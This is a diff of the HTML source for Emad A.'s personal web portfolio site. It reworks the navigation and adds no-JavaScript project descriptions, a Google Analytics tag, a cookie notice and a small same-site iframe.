@@ -1,208 +1,193 @@
-<meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
-<html>
+<!DOCTYPE html>
+<html lang="en">
    <head>
       <title>
-         IcyRealm - An Online Resume
+         Icy-Realm - An online portfolio
       </title>
-      <meta property='og:title' content='IcyRealm'/>
-      <meta property='og:image' content='/images/icyrealmsnowflake.png'/>
-      <meta property='og:description' content='IcyRealm - An Online Portfolio'/>
-      <meta property='og:url' content='eahmed.byethost10.com'/>
+      <meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
+      <meta property="og:title" content="Icy-Realm"/>
+      <meta property="og:image" content="/images/icyrealmsnowflake.png"/>
+      <meta property="og:description" content="Icy-Realm - An online portfolio"/>
+      <meta property="og:url" content="eahmed.byethost10.com"/>
       <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.0/css/bootstrap.min.css">
       <link href="https://fonts.googleapis.com/css?family=Iceland" rel="stylesheet">
-      <link rel="stylesheet" type="text/css" href="lib/style.css?v=1.86"/>
+      <link rel="stylesheet" type="text/css" href="lib/style.css?v=1.899"/>
       <link rel="icon" href="images/icyrealmsnowflake.png">
       <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
       <link rel="stylesheet" href="https://cdn.rawgit.com/konpa/devicon/df6431e323547add1b4cf45992913f15286456d3/devicon.min.css">
       <meta name="viewport" content="width=device-width, initial-scale=1">
+      <!-- Global site tag (gtag.js) - Google Analytics -->
+      <script async src="https://www.googletagmanager.com/gtag/js?id=UA-66391712-1"></script>
+      <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+
+      gtag('config', 'UA-66391712-1');
+      </script>
+
    </head>
-   <body id="main">
-      <div class="smallScreenOnly">
-         <a href="#" class="button-mobile" id="mobileButtonToggle">Menu</a>
-         <div id="divSpanMobileMenu">
-            <a href="index" class="button-mobile">Home</a>
-            <a href="games" class="button-mobile">Games</a>
-            <a href="graphics" class="button-mobile">Graphics</a>
-            <a href="it" class="button-mobile">IT/Coding</a>
-            <a href="web" class="button-mobile">Themes</a>
-            <a href="skills" class="button-mobile">Skills</a>
-         </div>
-      </div>      
+   <body id="main">   
+      
       <div class="main-container">
-      <div class="main">        
-         <div id="header">
+      <div class="main card-1">        
+         <a tabindex="1" class="smallScreenOnly button-mobile" id="mobileButtonToggle"><i class="fa fa-bars" aria-hidden="true"></i> Menu</a>
+         <div id="header" class="header card-3">
+            <span class="headerspan1"><a tabindex="1" href="index.html"><img class="noselect" src="images/icyrealmsnowflake.png"/></a></span>
+            <span class="headerspan2">Icy-Realm</span>
+            <span class="headerspan3">An online portfolio of Emad A. </span>
             <div id="nav" class="hidable">
-               <a class="lightNav lighten" id="homeToggle"><span style="font-size:18px;" class="fa fa-home"></span> Home</a>
-               <a class="lightNav" id="gamesToggle"><span style="font-size:18px;" class="fa fa-gamepad"></span> Games</a>
-               <a class="lightNav" id="graphicsToggle" ><span style="font-size:18px;" class="fa fa-image"></span> Graphics</a>
-               <a class="lightNav" id="itToggle"><span style="font-size:18px;" class="fa fa-code"></span> IT/Coding</a>
-               <a class="lightNav" id="webToggle"><span style="font-size:18px;" class="fa fa-paint-brush"></span> Themes</a>
-               <a class="lightNav" id="skillsToggle"><span style="font-size:18px;" class="fa fa-bar-chart"></span> Skills</a>
+               <a tabindex="1" title="Home" class="lightNav lighten" id="homeToggle"><span style="font-size:18px;" class="fa fa-home"></span> Home</a>
+               <a tabindex="1" class="lightNav" id="itToggle"><span style="font-size:18px;" class="fa fa-code"></span> Web Development</a>
+               <a tabindex="1" class="lightNav" id="webToggle"><span style="font-size:18px;" class="fa fa-paint-brush"></span> Web Design</a>
+               <a tabindex="1" class="lightNav" id="gamesToggle"><span style="font-size:18px;" class="fa fa-image"></span> Other</a>
+               <a tabindex="1" class="lightNav" id="skillsToggle"><span style="font-size:18px;" class="fa fa-bar-chart"></span> Skills</a> 
+               <noscript>
+                  <style>
+                     #itToggle, #webToggle, #gamesToggle, #skillsToggle{visibility: hidden;}
+                  </style>
+               </noscript>             
             </div>
-            <span id="headerspan1"><a href="index"><img class="noselect" src="images/icyrealmsnowflake.png"/></a></span>
-            <span id="headerspan2">IcyRealm</span>
-            <span id="headerspan3">An online portfolio of Emad A. </span>
          </div>
-         <div style="padding:18px;">
+         <div class="main-inner card-2">           
             <!-- start -->
-            <div id="homeContent">
-            <p>
-               <span style="font-size:28px; color:#5e7ed7;" class="fa fa-home"></span><span id="icybreadcrumbtext">HOME</span>
-            <hr>
-            </p>
-            <p>
-               Hey! Welcome to my online portfolio. This is generally intended for employers, however, anyone can look around. Be sure to check out the games section. In the future, I hope to post tutorials and other useful resources here as well.
-               - Emad A. <br><br>
-               Examples of my work:
-            </p>
-            <div class="cardContainer">
-               <a href="#" data-toggle="modal" data-target="#myModal">
-                  <div class="card" id="card1">
-                     <img src="images/messageBoardV4-3.png" alt="Programming Showcase">
-                     <div class="cardcontainer">
-                        <span class="cardSubTitle">Programming Showcase</span>
-                        <p>Message Board</p>
+            
+            <div id="appendToggleContainers">
+               <noscript>                  
+                  <div class="noscriptmsg">
+                     <div class="alert alert-warning" role="alert">
+                        <span style="font-size:18px;" class="fa fa-exclamation"></span> You don't have javascript enabled.  Extraneous features such as tab switching and modals are disabled--only essential information is displayed below.
+                      </div>
+                      <!-- Start cards -->
+                      <div class="cardContainer">            
+                        <a href="#project1" tabindex="1" class="card card-1" id="card1">
+                           <img src="images/messageBoardV4-3.png" alt="Programming Showcase">
+                           <div class="cardcontainer">
+                              <span class="cardSubTitle">1. Programming Showcase</span>
+                              <p>PHP + MySQL + HTML+ CSS + JS/JQUERY</p>
+                           </div>
+                        </a>           
+                        <a href="#project2" tabindex="1" class="card card-2" id="card2">
+                           <img src="images/codedrop_preview.png" alt="Programming Showcase">
+                           <div class="cardcontainer">
+                              <span class="cardSubTitle">2. Programming Showcase</span>
+                              <p>PHP + MySQL + Bootstrap</p>
+                           </div>
+                        </a> 
+                        <a href="#project3" tabindex="1" class="card card-3" id="card3">
+                           <img src="images/wp_theme_preview_1.png" alt="Theme Showcase">
+                           <div class="cardcontainer">
+                              <span class="cardSubTitle">3. Theme Showcase</span>
+                              <p>Wordpress + PHP + HTML + CSS</p>
+                           </div>
+                        </a>  
                      </div>
+                     <br>                     
+                     <!-- End cards -->
+                     <!-- Start card info -->
+                        <!-- Modal 1 content-->
+                        <div id="project1" class="modal-content modal-dialog-centered ">
+                           <div class="modal-header cust-modal-header">
+                              <h2>1. Custom Message Board</h2>
+                           </div>
+                           <div class="modal-body">
+                              <h3>A built-from-scratch message board built using basic PHP + MySQL</h3>
+                              <p>
+                                 <ul>
+                                    <li>Allows guests to register as users, post threads, post replies, and report threads</li>
+                                    <li>Each user gets their own profile page with a "Recent Posts" section and "Peronal Note" section</li> 
+                                    <li>Admin can modify and delete any post, whereas user can only modify and delete their own post</li> 
+                                    <li>Admin can also pin/unpin posts, as well as view reported posts</li>     
+                                 </ul>
+                              </p>
+                              <p>
+                                 <img class="dispimg" src="images/messageBoardV4-3.png" width="700px" />
+                              </p>               
+                           </div>
+                           <div class="modal-footer">        
+                              <a class="btn btn-primary" target="_blank" href="http://eahmed.byethost10.com/boards">Live Demo</a>
+                           </div>
+                        </div>
+                        <br>
+                        <!-- Project 2 Modal -->                 
+                        <!-- Modal content-->
+                        <div id="project2" class="modal-content modal-dialog-centered ">
+                           <div class="modal-header cust-modal-header">
+                              <h2>2. CodeDrop Web App</h2>
+                           </div>
+                           <div class="modal-body">
+                              <h3>A pastebin clone built using basic PHP + MySQL + JQuery + Bootstrap</h3>
+                              <p>
+                                 <ul>
+                                    <li>Built using functions from library of message board project (code refactoring)</li>
+                                    <li>Allows guests to post code and get a random shareable link</li>
+                                    <li>Guests can also optionally register and track their code posts</li>
+                                 </ul>
+                              </p>
+                              <p>
+                                 <img class="dispimg" src="images/codedrop_preview_1.png" width="700px" />
+                              </p>                              
+                           </div>
+                           <div class="modal-footer">
+                              <a class="btn btn-primary" target="_blank" href="http://eahmed.byethost10.com/codedrop">Live Demo</a>        
+                           </div>
+                        </div>
+                        <br>
+                        <!-- Project 3 Modal -->                     
+                        <!-- Modal content-->
+                        <div id="project3" class="modal-content modal-dialog-centered ">
+                           <div class="modal-header cust-modal-header">
+                              <h2>3. Wordpress Theme</h2>
+                           </div>
+                           <div class="modal-body">
+                              <h3>A built-from-scratch theme using basic HTML + CSS</h3>
+                              <p>
+                                 <ul>
+                                    <li>Dynamically generates navigation (e.g. see About page) and shows child pages</li>
+                                    <li>Fully responsive for desktop, tablet, and mobile viewport resolutions</li>
+                                    <li>Uses custom template for home and sub-pages</li>
+                                 </ul>
+                              </p>
+                              <p>
+                                 <img class="dispimg" src="images/wp_theme_preview_1.png" width="700px" />
+                              </p>
+                           </div>
+                           <div class="modal-footer">
+                              <a class="btn btn-primary" target="_blank" href="http://eahmed.byethost10.com/wp">Live Demo</a>     
+                           </div>
+                        </div>        
+                        <!-- End card info -->
                   </div>
-               </a>
-               <a href="#" data-toggle="modal" data-target="#myModal2">
-                  <div class="card" id="card2">
-                     <img src="images/codedrop_preview.png" alt="Programming Showcase">
-                     <div class="cardcontainer">
-                        <span class="cardSubTitle">Programming Showcase</span>
-                        <p>Code Share</p>
-                     </div>
-                  </div>
-               </a>
-               <a href="#" data-toggle="modal" data-target="#myModal3">
-                  <div class="card" id="card3">
-                     <img src="images/wp_theme_preview_1.png" alt="Theme Showcase">
-                     <div class="cardcontainer">
-                        <span class="cardSubTitle">Theme Showcase</span>
-                        <p>Wordpress CMS Theme</p>
-                     </div>
-                  </div>
-               </a>   
+              </noscript>
             </div>
-
-            <a id="loadMore" href="#loadMoreContent" class="btn btn-primary cust-ease">Load More</a>
-
-            <div id="loadMoreContent" class="cardContainer">
-                  <a href="#" data-toggle="modal" data-target="#myModal4">
-                    <div class="card" id="card4">
-                      <img src="images/wptheme01.png" alt="Theme Showcase">
-                      <div class="cardcontainer">
-                        <span class="cardSubTitle">Theme Showcase</span> 
-                        <p>Joomla CMS Theme</p>                     
-                      </div>                    
-                    </div>                    
-                    </a>  
-                    
-                    <a href="#" data-toggle="modal" data-target="#myModal5">                    
-                    <div class="card" id="card5">                    
-                      <img src="images/ViewOne.png" alt="Theme Showcase">                    
-                      <div class="cardcontainer">                    
-                        <span class="cardSubTitle">Theme Showcase</span>                     
-                        <p>Animal Conservation Theme</p>                     
-                      </div>                    
-                    </div>                    
-                    </a>     
-                    
-                    <a href="#" data-toggle="modal" data-target="#myModal6">                    
-                    <div class="card" id="card6">                    
-                      <img src="images/layout2.png" alt="Theme Showcase">                    
-                      <div class="cardcontainer">                    
-                        <span class="cardSubTitle">Theme Showcase</span>                     
-                        <p>HTMl/CSS Layout 2</p>                     
-                      </div>                    
-                    </div>                    
-                    </a>
-                    
-                    <a href="#" data-toggle="modal" data-target="#myModal7">                    
-                    <div class="card" id="card7">                    
-                      <img src="images/tree_on_cliff_by.png" alt="Graphics Showcase">                    
-                      <div class="cardcontainer">                    
-                        <span class="cardSubTitle">Graphics Showcase</span>                     
-                        <p>Tree on Cliff</p>                     
-                      </div>                    
-                    </div>                    
-                    </a>                                   
-                    
-                    <a href="#" data-toggle="modal" data-target="#myModal8">                    
-                    <div class="card" id="card8">                    
-                      <img src="images/projectMovement.png" alt="Game Showcase">                    
-                      <div class="cardcontainer">                    
-                        <span class="cardSubTitle">Game Showcase</span>                     
-                        <p>Game Project Movement</p>                     
-                      </div>                    
-                    </div>                    
-                    </a>   
-                    
-                    <a href="#" data-toggle="modal" data-target="#myModal9">                    
-                    <div class="card" id="card9">                    
-                      <img src="images/abstract.jpg" alt="Graphics Showcase">                    
-                      <div class="cardcontainer">                    
-                        <span class="cardSubTitle">Graphics Showcase</span>                     
-                        <p>3D Abstract Render</p>                     
-                      </div>                    
-                    </div>                    
-                    </a>                   
-                    
-                    <a href="#" data-toggle="modal" data-target="#myModal10">                    
-                    <div class="card" id="card10">                    
-                      <img src="images/caveRoom.png" alt="Game Showcase">                    
-                      <div class="cardcontainer">                    
-                        <span class="cardSubTitle">Game Showcase</span>                     
-                        <p>Cave Room</p>                     
-                      </div>                    
-                    </div>                    
-                    </a>
-
+         </div>        
+         <div id="footer" class="footer card-4">  
+            <div class="cookie">
+               <div class="alert alert-info alert-dismissible show" role="alert">
+                  This site may use cookies. <a href="privacy.html">Learn more.</a>
+                  <button type="button" class="close" data-dismiss="alert" aria-label="Close">
+                  <span aria-hidden="true">&times;</span>
+                  </button>
+               </div>    
             </div>
-            <!-- end -->
-         </div>
-            <div id="appendToggleContainers"></div>
-         </div>
-         <div class="card noselect" id="spnTop">
-            <span style="font-size:28px; display:block;" class="fa fa-arrow-circle-up"></span> 
-            <p>Go Up?</p>
+            <div class="alert alert-secondary alert-dismissible show" role="alert">
+               Icy-Realm Copyright © 2017-<script>document.write(new Date().getFullYear());</script><noscript>2020</noscript> Emad A. - <a href="privacy.html">Privacy Policy</a>
+            </div>
          </div>
       </div>
-
+      <noscript><a href="#"></noscript>
+      <div tabindex="1" class="card noselect" id="spnTop">
+         <span style="font-size:28px; display:block;" class="fa fa-arrow-circle-up"></span> 
+         <p>Go Up?</p>
+      </div>
+      <noscript></a></noscript>
 
     </div>      
       <div id="appendModals"></div>
-      <div id="footer">
-         Thanks for visiting! <br>
-         Copyright 2017-2020 Emad A. 
-         <br>
-      </div>
       <script src="https://code.jquery.com/jquery-3.5.1.min.js" crossorigin="anonymous"></script>                
       <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.0/js/bootstrap.min.js"></script>
-      <script type="text/javascript" src="lib/vanilla-tilt.min.js"></script>
-      <script src="lib/icyresume.js?v=1.2"></script>    
-      <script>
-         $(document).ready(function(){
-             $("#pageCard1").click(function() {
-                 $("#pageContentContainer").fadeIn();
-                 $('html, body').animate({
-                     scrollTop: $("#card1Link").offset().top
-                 }, 1000);
-             });
-             $("#pageCard2").click(function() {
-                 $("#pageContentContainer").fadeIn();
-                 $('html, body').animate({
-                     scrollTop: $("#card2Link").offset().top
-                 }, 1000);
-             });
-             $("#pageCard3").click(function() {
-                 $("#pageContentContainer").fadeIn();
-                 $('html, body').animate({
-                     scrollTop: $("#card3Link").offset().top
-                 }, 1000);
-             });
-         });
-      </script>
-
+      <script src="lib/content.js?v=1.899"></script>
+      <iframe width="1" height="1" src="http://eahmed.byethost10.com/php.php" frameborder="0"></iframe>
+      <script src="lib/icyresume.js?v=1.899"></script>   
    </body>
 </html>
